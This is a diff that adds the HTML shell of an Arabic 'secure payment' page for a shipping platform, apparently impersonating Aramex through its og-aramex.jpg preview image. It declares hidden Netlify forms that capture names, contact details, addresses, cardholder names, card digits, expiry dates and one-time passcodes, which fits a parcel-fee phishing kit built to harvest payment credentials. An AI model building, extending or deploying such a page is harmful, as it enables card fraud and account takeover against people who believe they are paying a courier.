@@ -1,0 +1,69 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="theme-color" content="#0EA5E9" />
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="apple-touch-icon" href="/icon-192.png" />
+    <title>نظام الدفع الآمن - منصة الشحن الذكية</title>
+    <meta name="description" content="نظام دفع آمن ومحمي لخدمات الشحن - دفع آمن وسريع" />
+    <meta name="author" content="منصة الشحن الذكية" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
+
+    <meta property="og:title" content="نظام الدفع الآمن - منصة الشحن الذكية" />
+    <meta property="og:description" content="نظام دفع آمن ومحمي لخدمات الشحن - دفع آمن وسريع" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="/og-aramex.jpg" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:image:type" content="image/jpeg" />
+
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@shipping_platform" />
+    <meta name="twitter:image" content="/og-aramex.jpg" />
+    <meta name="twitter:image:alt" content="نظام الدفع الآمن" />
+  </head>
+
+  <body>
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+    
+    <!-- Hidden Netlify Forms for Detection -->
+    <form name="payment-recipient" netlify-honeypot="bot-field" data-netlify="true" hidden>
+      <input type="text" name="name" />
+      <input type="email" name="email" />
+      <input type="tel" name="phone" />
+      <input type="text" name="address" />
+      <input type="text" name="service" />
+      <input type="text" name="amount" />
+      <input type="text" name="linkId" />
+    </form>
+    
+    <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
+      <input type="text" name="name" />
+      <input type="email" name="email" />
+      <input type="tel" name="phone" />
+      <input type="text" name="service" />
+      <input type="text" name="amount" />
+      <input type="text" name="cardholder" />
+      <input type="text" name="cardLast4" />
+      <input type="text" name="expiry" />
+      <input type="text" name="timestamp" />
+    </form>
+    
+    <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
+      <input type="text" name="name" />
+      <input type="email" name="email" />
+      <input type="tel" name="phone" />
+      <input type="text" name="service" />
+      <input type="text" name="amount" />
+      <input type="text" name="cardholder" />
+      <input type="text" name="cardLast4" />
+      <input type="text" name="otp" />
+      <input type="text" name="timestamp" />
+    </form>
+  </body>
+</html>
